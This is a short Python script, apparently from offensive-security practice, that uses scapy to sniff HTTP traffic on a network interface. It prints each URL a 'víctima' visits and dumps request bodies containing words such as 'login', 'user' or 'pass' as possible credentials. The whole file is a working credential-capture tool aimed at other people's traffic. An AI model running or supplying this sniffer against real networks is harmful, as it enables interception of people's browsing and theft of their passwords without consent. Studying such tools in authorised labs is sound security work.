import argparse
import pyfiglet
import sys
import signal
import scapy.all as scapy 
from scapy.layers import http
from termcolor import colored

ascii_banner = pyfiglet.figlet_format("HTTP SNIFFER")
print(colored(ascii_banner,'yellow'))

def def_handler(sig, frame):
    print(colored(f"\n[!] Saliendo del programa...",'red'))
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler) #ctrl + c

def get_arguments():
    parser = argparse.ArgumentParser(description='HTTP Sniffer')
    parser.add_argument("-i", "--interface", dest="interface", required=True, help="Interfaz de red para sniffear solicitudes HTTP")

    return parser.parse_args()

def process_packet(packet):
    cred_keywords =  ["login", "user", "pass", "mail"]

    if packet.haslayer(http.HTTPRequest):

        url = "http://" + packet[http.HTTPRequest].Host.decode() + packet[http.HTTPRequest].Path.decode()

        print(colored(f"\n[+] URL visitada por la v√≠ctima: {url}",'blue'))

        if packet.haslayer(scapy.Raw):
            try:
                response = packet[scapy.Raw].load.decode()
                
                for keyword in cred_keywords:
                    if keyword in response:
                        print(colored(f"\n[+] Posibles credenciales: {response}\n", 'green'))
                        break
            except:
                pass


def sniff(interface):
    scapy.sniff(iface=interface, prn=process_packet, store=0)

def main():

    arguments = get_arguments()
    sniff(arguments.interface)

if __name__ == '__main__':
    main()